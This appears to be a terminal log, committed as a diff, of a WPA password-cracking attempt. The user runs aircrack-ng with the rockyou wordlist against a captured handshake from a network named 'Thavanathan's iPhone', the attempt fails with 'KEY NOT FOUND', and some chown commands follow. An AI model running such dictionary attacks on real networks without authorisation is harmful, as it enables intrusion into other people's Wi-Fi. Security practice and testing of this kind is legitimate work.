+.bin/             CONTRIBUTORS.md   Fuzzing/          .gitattributes    .gitignore        Miscellaneous/    Pattern-Matching/ README.md         Usernames/        
+k-rakeshan@Hellboy:~$ aircrack-ng capture-01.cap -w ./Kali-Shared-Folder/SecLists/rockyou.txt
+Reading packets, please wait...
+Opening capture-01.cap
+Read 13203 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  A6:8E:DC:82:EB:7B  Thavanathan’s iPhone    WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening capture-01.cap
+Read 13203 packets.
+
+1 potential targets
+
+
+
+                               Aircrack-ng 1.7 
+
+      [00:20:52] 14345516/14344391 keys tested (11630.99 k/s) 
+
+      Time left: 1176606352 days, 21 hours, 2 minutes, 56 seconds    100.01%
+
+                                KEY NOT FOUND
+
+
+      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+
+
+k-rakeshan@Hellboy:~$ sudo chown k-rakeshan *.csv
+[sudo] password for k-rakeshan: 
+k-rakeshan@Hellboy:~$ sudo chown k-rakeshan capture-01.cap capture-01.netxml
+chown: cannot access 'capture-01.netxml': No such file or directory
+k-rakeshan@Hellboy:~$ sudo chown k-rakeshan capture-01.cap capture-01.kismet.netxml 
+k-rakeshan@Hellboy:~$  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
